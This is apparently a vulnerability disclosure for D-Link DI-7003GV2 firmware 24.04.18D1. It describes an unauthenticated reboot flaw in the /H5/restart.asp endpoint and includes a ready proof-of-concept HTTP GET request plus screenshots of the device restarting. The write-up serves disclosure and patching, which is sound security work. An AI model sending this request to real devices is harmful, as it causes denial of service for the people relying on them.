# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) contains an authentication bypass vulnerability in the `/H5/restart.asp` interface. Remote attackers can reboot the device without authentication by sending a crafted HTTP request. Exploitation causes immediate service disruption and temporary denial of access while the device restarts.

# Vulnerability details

The processing function for the `H5/restart.asp` interface is `sub_49826C`.

![图 0](img/5af1a48ac7d4eecbf498f4325d23c6ac46c2f7c54fef89ff58c7eb7d53128fcb.png)  

`sub_49826C` function will reboot the device.

![图 1](img/f3e66cd7f4efee4175d521f24b51daa1c63afc233e9956f222fe04216d5caeb0.png)  


# Poc

After sending the data packet, a success message will be received.

```http
GET /H5/restart.asp HTTP/1.1
Host: 192.168.140.240
Content-Length: 0
Cache-Control: max-age=0
Origin: http://192.168.140.240
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.140.240/login.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```

![图 2](img/cf2d4b3b3656a38e25530862d037f2c9dd376f459363f4be3d7d46b63be8b365.png)  

The device is no longer accessible and the reboot process has begun.

![图 3](img/459928023eb1e003c1cc992ebd156c456d6d2aa1b7c5ebd50f2413a5563a0171.png)  

About two minutes later, the device became accessible, and the device's runtime changed to 1 minute and 5 seconds.

![图 4](img/5e7355475fe216da4d08ef6e8f1ba071f5e192e78dbfab3ba81b125e2e2e6b6d.png)  
